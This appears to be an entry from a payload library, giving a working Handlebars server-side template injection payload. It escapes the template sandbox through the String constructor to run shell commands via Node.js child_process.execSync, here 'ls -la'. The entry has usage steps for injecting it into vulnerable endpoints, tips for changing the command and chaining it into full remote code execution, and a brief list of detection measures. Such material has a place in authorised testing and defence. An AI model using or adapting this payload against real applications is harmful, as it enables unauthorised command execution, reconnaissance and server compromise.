---
id: efc8c13d-b2f9-47aa-9be8-bb1fad232798
type: code
language: handlebars
verified: true
created_at: '2023-04-06T03:56:39.251530+00:00'
updated_at: '2023-04-10T20:23:36.729023+00:00'
tags:
  - ssti
  - handlebars
  - command-execution
  - payload
platforms:
  - Web
  - Node.js
validated: true
---

# Handlebars-SSTI-List-Files-Payload

## Code

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Description

This Handlebars template payload exploits Server-Side Template Injection by polluting the prototype chain to access Node.js constructors and globals. It constructs a JavaScript function that uses require('child_process').execSync to execute the 'ls -la' command, listing files in the current directory with detailed attributes. The output is rendered directly into the application's response, providing file system reconnaissance without additional tools on the target.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Command in execSync | The shell command to execute (hardcoded as 'ls -la'; modify for other OS or commands) | 'ls -la' or 'dir' for Windows |

## Usage

Inject this payload into any user-controlled input that is processed by an unsanitized Handlebars template, such as a form field or query parameter. For example, submit it via a POST request to a vulnerable endpoint. The payload executes during template rendering on the server, embedding the command output in the HTML response. Ideal for initial reconnaissance in Node.js web apps; chain with other payloads for read/write file operations or full RCE.

## Detection

- Monitor for anomalous template expressions in application logs or WAF alerts containing nested 'with' blocks or 'require' calls.
- Enable Node.js process monitoring for unexpected child_process.execSync invocations.
- Scan responses for shell command outputs like file listings in HTML.
- Use runtime application self-protection (RASP) tools to block access to dangerous prototypes like String.constructor.

## Related

- [[procedures/Handlebars-Server-Side-Template-Injection-List-Files]]
